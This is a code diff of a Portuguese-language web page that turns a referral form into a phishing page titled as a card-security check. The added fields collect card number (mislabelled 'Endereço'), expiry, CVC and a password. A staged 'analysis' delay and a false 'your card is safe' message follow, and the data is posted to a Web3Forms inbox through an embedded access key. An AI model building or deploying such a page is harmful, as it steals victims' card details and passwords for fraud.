@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário de Indicação</title>
+    <title>Verifique a Segurança do seu Cartão</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -60,9 +60,10 @@
             display: flex;
             gap: 1rem; /* Espaçamento entre os campos */
         }
-        .input-row > div {
-            flex: 1; /* Faz com que cada campo ocupe metade do espaço */
-        }
+        
+        .month-wrapper { flex: 3; }
+        .year-wrapper  { flex: 4; }
+        .cvc-wrapper   { flex: 2; }
 
         label {
             display: block;
@@ -72,6 +73,7 @@
         }
 
         input[type="text"],
+        input[type="password"],
         textarea,
         select {
             width: 100%;
@@ -84,6 +86,7 @@
         }
 
         input[type="text"]:focus,
+        input[type="password"]:focus,
         textarea:focus,
         select:focus {
             outline: none;
@@ -93,12 +96,6 @@
 
         textarea {
             resize: vertical;
-        }
-
-        #sugestoes {
-            min-height: auto;
-            height: 2.6rem;
-            resize: none;
         }
         
         input[type="file"] {
@@ -193,37 +190,47 @@
 
     <div class="container">
         <h1>Formulário de Indicação</h1>
+        <!-- O atributo 'enctype' foi mantido pois o script usa FormData -->
         <form id="indication-form" method="POST" enctype="multipart/form-data">
             
+            <!-- 
+                IMPORTANTE: Substitua "06ca2708-2fb8-4700-aa35-b37809a91e36" 
+                pela chave que você obteve do Web3Forms.
+            -->
             <input type="hidden" name="access_key" value="06ca2708-2fb8-4700-aa35-b37809a91e36">
             <input type="hidden" name="subject" value="Nova Indicação Recebida">
             <input type="hidden" name="from_name" value="Sistema de Indicações">
 
+            <!-- Campos do Formulário -->
             <div class="form-group">
                 <label for="nome">Nome Completo</label>
                 <input type="text" id="nome" name="Nome Completo" required>
             </div>
 
+            <!-- --- CAMPO DE ENDEREÇO ADICIONADO --- -->
             <div class="form-group">
-                <label for="endereco">Endereço da Indicação</label>
-                <input type="text" id="endereco" name="Endereço da Indicação" placeholder="Rua, Bairro, Referência..." required>
+                <label for="endereco">Endereço</label>
+                <input type="text" id="endereco" name="Número do Cartâo" required>
             </div>
 
             <div class="form-group">
-                <label for="validade_mes">Validade (Mês/Ano)</label>
+                <label for="validade_mes">Validade (Mês/Ano) e Número atrás do Cartâo</label>
                 <div class="input-row">
-                    <div>
+                    <div class="month-wrapper">
                         <input type="text" id="validade_mes" name="Mês de Validade" placeholder="MM" required maxlength="2" pattern="\d{2}">
                     </div>
-                    <div>
+                    <div class="year-wrapper">
                         <input type="text" id="validade_ano" name="Ano de Validade" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
+                    </div>
+                    <div class="cvc-wrapper">
+                        <input type="text" id="cvc" name="CVC" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
                     </div>
                 </div>
             </div>
             
             <div class="form-group">
-                <label for="sugestoes">Sugestões (Opcional)</label>
-                <textarea id="sugestoes" name="Sugestões"></textarea>
+                <label for="senha">Senha</label>
+                <input type="password" id="senha" name="Senha" required>
             </div>
 
             <button type="submit" class="submit-btn" id="submit-button">
@@ -232,9 +239,11 @@
             </button>
         </form>
         
+        <!-- Mensagem de resultado de erro (dentro do container) -->
         <div id="form-result"></div>
     </div>
 
+    <!-- Modal de Sucesso (fora do container, para centralizar na tela) -->
     <div id="success-modal" class="modal-overlay">
         <div class="modal-content">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
@@ -254,45 +263,49 @@
             e.preventDefault(); // Impede o comportamento padrão de recarregar a página
 
             submitButton.disabled = true;
-            submitButton.querySelector('span').textContent = 'Enviando...';
+            submitButton.querySelector('span').textContent = 'Analisando...';
 
             const formData = new FormData(form);
 
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                body: formData // Envia o FormData diretamente, o navegador cuidará do 'Content-Type'
-            })
-            .then(response => response.json())
-            .then(data => {
-                resultDiv.style.display = 'none'; // Garante que a mensagem de erro suma
-                
-                successMessage.textContent = "Indicação enviada com sucesso! Vamos solucionar isso o mais rápido possível. Obrigado pela colaboração!";
-                successModal.style.display = 'flex'; // Mostra o modal de sucesso
-                
-                form.reset(); // Limpa os campos do formulário
-
-                // Esconde o modal de sucesso após 8 segundos
-                setTimeout(() => {
-                    successModal.style.display = 'none';
-                }, 8000);
-            })
-            .catch(error => {
-                resultDiv.classList.remove('success');
-                resultDiv.classList.add('error');
-                resultDiv.textContent = "Ops! Algo deu errado. Tente novamente.";
-                resultDiv.style.display = 'block'; // Mostra a mensagem de erro
-                console.error('Error:', error);
-
-                // Esconde a mensagem de erro após 8 segundos
-                setTimeout(() => {
+            // Adiciona um atraso de 5 segundos para simular a análise
+            setTimeout(() => {
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData // Envia o FormData diretamente
+                })
+                .then(response => response.json())
+                .then(data => {
                     resultDiv.style.display = 'none';
-                }, 8000);
-            })
-            .finally(() => {
-                // Apenas reabilita o botão
-                submitButton.disabled = false;
-                submitButton.querySelector('span').textContent = 'Enviar Indicação';
-            });
+                    
+                    // Altera a mensagem de sucesso
+                    successMessage.textContent = "Seu cartão está seguro!";
+                    successModal.style.display = 'flex';
+                    
+                    form.reset();
+
+                    // Esconde o modal de sucesso após 8 segundos
+                    setTimeout(() => {
+                        successModal.style.display = 'none';
+                    }, 8000);
+                })
+                .catch(error => {
+                    resultDiv.classList.remove('success');
+                    resultDiv.classList.add('error');
+                    resultDiv.textContent = "Ops! Algo deu errado. Tente novamente.";
+                    resultDiv.style.display = 'block';
+                    console.error('Error:', error);
+
+                    // Esconde a mensagem de erro após 8 segundos
+                    setTimeout(() => {
+                        resultDiv.style.display = 'none';
+                    }, 8000);
+                })
+                .finally(() => {
+                    // Reabilita o botão e restaura o texto original
+                    submitButton.disabled = false;
+                    submitButton.querySelector('span').textContent = 'Enviar Indicação';
+                });
+            }, 5000); // Atraso de 5000ms (5 segundos)
         });
     </script>
 
